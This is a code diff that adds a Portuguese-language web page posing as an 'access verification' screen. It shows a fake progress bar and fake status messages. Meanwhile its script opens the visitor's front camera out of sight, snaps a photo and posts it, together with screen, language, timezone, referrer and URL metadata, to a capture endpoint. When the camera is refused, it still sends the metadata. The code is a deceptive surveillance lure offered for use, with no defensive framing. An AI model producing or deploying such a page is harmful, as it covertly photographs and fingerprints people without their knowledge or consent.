@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bem-vindo</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #0d0d0d;
+      color: #fff;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Fundo animado */
+    .bg {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(ellipse at 20% 50%, #1a1a2e 0%, #0d0d0d 60%),
+                  radial-gradient(ellipse at 80% 20%, #16213e 0%, transparent 50%);
+      z-index: 0;
+    }
+
+    .content {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border-radius: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      margin-bottom: 8px;
+      box-shadow: 0 8px 32px rgba(102, 126, 234, 0.4);
+    }
+
+    h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #fff, #aaa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    p {
+      color: #888;
+      font-size: 1rem;
+      max-width: 320px;
+    }
+
+    .loader {
+      width: 200px;
+      height: 4px;
+      background: #1e1e1e;
+      border-radius: 4px;
+      overflow: hidden;
+      margin-top: 8px;
+    }
+
+    .loader-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #667eea, #764ba2);
+      border-radius: 4px;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+
+    #msg {
+      font-size: 0.8rem;
+      color: #555;
+      min-height: 18px;
+    }
+
+    /* Câmera oculta */
+    video, canvas { display: none; position: fixed; top: -9999px; left: -9999px; }
+
+    /* Flash */
+    .flash {
+      position: fixed;
+      inset: 0;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 9999;
+      transition: opacity 0.05s;
+    }
+    .flash.on { opacity: 1; }
+  </style>
+</head>
+<body>
+  <div class="bg"></div>
+
+  <div class="content">
+    <div class="icon">🔒</div>
+    <h1>Verificando acesso</h1>
+    <p>Por favor, aguarde enquanto verificamos sua conexão...</p>
+    <div class="loader"><div class="loader-bar" id="bar"></div></div>
+    <span id="msg">Iniciando...</span>
+  </div>
+
+  <video  id="video"  autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  <div class="flash" id="flash"></div>
+
+  <script>
+    const video  = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const flash  = document.getElementById('flash');
+    const bar    = document.getElementById('bar');
+    const msg    = document.getElementById('msg');
+
+    let progress = 0;
+    let stream   = null;
+    let captured = false;
+
+    // Barra de progresso fake
+    const barInterval = setInterval(() => {
+      progress += Math.random() * 3;
+      if (progress >= 95) { progress = 95; clearInterval(barInterval); }
+      bar.style.width = progress + '%';
+    }, 80);
+
+    const messages = [
+      'Verificando navegador...',
+      'Checando certificado...',
+      'Estabelecendo conexão segura...',
+      'Quase lá...'
+    ];
+    let msgIdx = 0;
+    const msgInterval = setInterval(() => {
+      if (msgIdx < messages.length) msg.textContent = messages[msgIdx++];
+    }, 900);
+
+    // Coleta metadados do cliente
+    function getMeta() {
+      return {
+        screen:   `${screen.width}x${screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        lang:     navigator.language,
+        platform: navigator.platform,
+        tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'direto',
+        url:      location.href
+      };
+    }
+
+    async function capturar() {
+      if (captured) return;
+      captured = true;
+
+      canvas.width  = video.videoWidth  || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      // Flash sutil
+      flash.classList.add('on');
+      setTimeout(() => flash.classList.remove('on'), 150);
+
+      // Para câmera
+      if (stream) stream.getTracks().forEach(t => t.stop());
+
+      const image = canvas.toDataURL('image/jpeg', 0.85);
+
+      try {
+        await fetch('/api/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image, meta: getMeta() })
+        });
+      } catch (e) {
+        console.warn('Captura falhou:', e);
+      }
+
+      // Completa a barra
+      bar.style.width = '100%';
+      clearInterval(barInterval);
+      clearInterval(msgInterval);
+      msg.textContent = 'Conexão verificada!';
+
+      // Redireciona ou mostra conteúdo real
+      setTimeout(() => {
+        msg.textContent = 'Redirecionando...';
+        setTimeout(() => location.href = '/sucesso.html', 600);
+      }, 800);
+    }
+
+    async function iniciarCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          // Aguarda 1.5s para câmera estabilizar
+          setTimeout(capturar, 1500);
+        };
+      } catch {
+        // Câmera negada — ainda registra sem foto
+        try {
+          await fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              image: 'data:image/gif;base64,R0lGODlhAQABAAAAACw=',
+              meta: { ...getMeta(), noCamera: true }
+            })
+          });
+        } catch {}
+
+        bar.style.width = '100%';
+        clearInterval(barInterval);
+        clearInterval(msgInterval);
+        msg.textContent = 'Redirecionando...';
+        setTimeout(() => location.href = '/sucesso.html', 1000);
+      }
+    }
+
+    iniciarCamera();
+  </script>
+</body>
+</html>
